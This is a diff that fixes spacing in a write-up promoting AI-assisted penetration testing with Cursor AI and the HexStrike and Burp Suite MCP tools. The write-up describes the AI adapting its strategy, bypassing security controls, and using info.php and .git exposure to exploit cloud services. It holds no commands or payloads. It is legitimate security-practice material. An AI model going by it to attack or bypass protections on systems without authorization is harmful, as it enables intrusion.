-- **What has been tested:**Tracks tested endpoints
+- **What has been tested:** Tracks tested endpoints
 
-- **What works and what doesn’t:**Learns from failures
+- **What works and what doesn’t:** Learns from failures
 
-- **Relationships between findings:**Connects the dots
+- **Relationships between findings:** Connects the dots
 
 **Example:**
 
@@ -2765,13 +1972,13 @@ The AI maintains context throughout the entire penetration test:
 
 The AI doesn’t follow a rigid script. It adapts based on:
 
-- **Target responses:**Changes approach based on what works
+- **Target responses:** Changes approach based on what works
 
-- **Security controls:**Bypasses or works around protections
+- **Security controls:** Bypasses or works around protections
 
-- **Tool availability:**Uses alternatives when needed
+- **Tool availability:** Uses alternatives when needed
 
-- **Time constraints:**Prioritizes high-value targets
+- **Time constraints:** Prioritizes high-value targets
 
 **Example:**
 
@@ -2781,15 +1988,15 @@ The AI doesn’t follow a rigid script. It adapts based on:
 
 The AI automatically documents:
 
-- **All commands executed:**Complete audit trail
+- **All commands executed:** Complete audit trail
 
-- **All findings:**Structured vulnerability data
+- **All findings:** Structured vulnerability data
 
-- **All proofs:**Evidence for each finding
+- **All proofs:** Evidence for each finding
 
-- **Reasoning:**Why each step was taken
+- **Reasoning:** Why each step was taken
 
-**Example:**Instead of manually writing a report, the AI generates:
+**Example:** Instead of manually writing a report, the AI generates:
 
 - Full penetration test report with proofs
 
@@ -2803,7 +2010,7 @@ The AI automatically documents:
 
 **Time Comparison:**
 
-**Note:**Actual times vary, but AI-assisted testing is significantly faster while maintaining quality.
+**Note:** Actual times vary, but AI-assisted testing is significantly faster while maintaining quality.
 
 ### 6. Reduced Human Error
 
@@ -2831,13 +2038,13 @@ The AI automatically documents:
 
 The AI learns from:
 
-- **Successful attacks:**What worked and why
+- **Successful attacks:** What worked and why
 
-- **Failed attempts:**What didn’t work and why
+- **Failed attempts:** What didn’t work and why
 
-- **Tool performance:**Which tools are most effective
+- **Tool performance:** Which tools are most effective
 
-- **Target characteristics:**Patterns in target behavior
+- **Target characteristics:** Patterns in target behavior
 
 This learning improves future testing.
 
@@ -2845,7 +2052,7 @@ This learning improves future testing.
 
 ### 1. MCP Integration is Game-Changing
 
-**Lesson:**Having tools accessible via MCP enables AI to use them intelligently, not just execute them.
+**Lesson:** Having tools accessible via MCP enables AI to use them intelligently, not just execute them.
 
 **Impact:**
 
@@ -2859,7 +2066,7 @@ This learning improves future testing.
 
 ### 2. AI Reasoning is Critical
 
-**Lesson:**The AI’s ability to reason about findings and make decisions is more valuable than just tool automation.
+**Lesson:** The AI’s ability to reason about findings and make decisions is more valuable than just tool automation.
 
 **Impact:**
 
@@ -2873,7 +2080,7 @@ This learning improves future testing.
 
 ### 3. Graceful Degradation is Essential
 
-**Lesson:**When MCP tools fail, the AI must be able to fall back to direct commands.
+**Lesson:** When MCP tools fail, the AI must be able to fall back to direct commands.
 
 **Impact:**
 
@@ -2887,7 +2094,7 @@ This learning improves future testing.
 
 ### 4. Documentation is Automatic
 
-**Lesson:**AI can generate comprehensive documentation automatically, saving hours of manual work.
+**Lesson:** AI can generate comprehensive documentation automatically, saving hours of manual work.
 
 **Impact:**
 
@@ -2901,7 +2108,7 @@ This learning improves future testing.
 
 ### 5. Cloud Services are Often Less Protected
 
-**Lesson:**While the main web application had security level “impossible”, cloud services were vulnerable.
+**Lesson:** While the main web application had security level “impossible”, cloud services were vulnerable.
 
 **Impact:**
 
@@ -2915,7 +2122,7 @@ This learning improves future testing.
 
 ### 6. Information Disclosure is Critical
 
-**Lesson:**info.php and .git exposure provided critical information that enabled cloud service exploitation.
+**Lesson:** info.php and .git exposure provided critical information that enabled cloud service exploitation.
 
 **Impact:**
 
@@ -2931,47 +2138,47 @@ This learning improves future testing.
 
 This penetration test demonstrated the power of AI-assisted security testing when combined with MCP integration. The combination of:
 
-- **Cursor AI:**Intelligent orchestration and reasoning
+- **Cursor AI:** Intelligent orchestration and reasoning
 
-- **HexStrike MCP:**150+ security tools via unified interface
+- **HexStrike MCP:** 150+ security tools via unified interface
 
-- **Burp Suite MCP:**Professional web application testing
+- **Burp Suite MCP:** Professional web application testing
 
 Creates a testing methodology that is:
 
-- **Faster:**Automated execution and intelligent tool selection
+- **Faster:** Automated execution and intelligent tool selection
 
-- **More Comprehensive:**Systematic coverage with context awareness
+- **More Comprehensive:** Systematic coverage with context awareness
 
-- **More Intelligent:**Adaptive strategy based on findings
+- **More Intelligent:** Adaptive strategy based on findings
 
-- **Better Documented:**Automatic report generation
+- **Better Documented:** Automatic report generation
 
-- **More Resilient:**Graceful degradation when tools fail
+- **More Resilient:** Graceful degradation when tools fail
 
 ### Key Takeaways
 
-- **MCP is the Future:**Standardized tool integration enables AI to use tools intelligently
+- **MCP is the Future:** Standardized tool integration enables AI to use tools intelligently
 
-- **AI Reasoning Matters:**It’s not just automation, it’s intelligent decision-making
+- **AI Reasoning Matters:** It’s not just automation, it’s intelligent decision-making
 
-- **Adaptation is Key:**The ability to pivot strategy is crucial
+- **Adaptation is Key:** The ability to pivot strategy is crucial
 
-- **Documentation is Automatic:**AI can generate professional reports
+- **Documentation is Automatic:** AI can generate professional reports
 
-- **Cloud Services Need Testing:**They often have different security postures
+- **Cloud Services Need Testing:** They often have different security postures
 
 ### Future Directions
 
-- **More MCP Integrations:**Add more security tools via MCP
+- **More MCP Integrations:** Add more security tools via MCP
 
-- **Enhanced AI Reasoning:**Improve decision-making algorithms
+- **Enhanced AI Reasoning:** Improve decision-making algorithms
 
-- **Better Tool Chaining:**Automate complex multi-tool workflows
+- **Better Tool Chaining:** Automate complex multi-tool workflows
 
-- **Real-time Collaboration:**Multiple AI agents working together
+- **Real-time Collaboration:** Multiple AI agents working together
 
-- **Continuous Learning:**AI improves from each test
+- **Continuous Learning:** AI improves from each test
 
 ### Final Thoughts
 
@@ -2979,15 +2186,15 @@ AI-assisted penetration testing with MCP integration represents a paradigm shift
 
 This methodology is particularly powerful for:
 
-- **Red team exercises:**Fast, comprehensive testing
+- **Red team exercises:** Fast, comprehensive testing
 
-- **Bug bounty hunting:**Systematic coverage
+- **Bug bounty hunting:** Systematic coverage
 
-- **Security assessments:**Professional documentation
+- **Security assessments:** Professional documentation
 
-- **CTF competitions:**Rapid exploitation
+- **CTF competitions:** Rapid exploitation
 
-- **Security research:**Pattern discovery
+- **Security research:** Pattern discovery
 
 The future of penetration testing is AI-assisted, and MCP is the key to making it work.
 
@@ -3055,4 +2262,4 @@ The future of penetration testing is AI-assisted, and MCP is the key to making i
 01:10 - All reports complete
 ```
 
-**Total Time:**~70 minutes for complete penetration test and documentation
+**Total Time:** ~70 minutes for complete penetration test and documentation
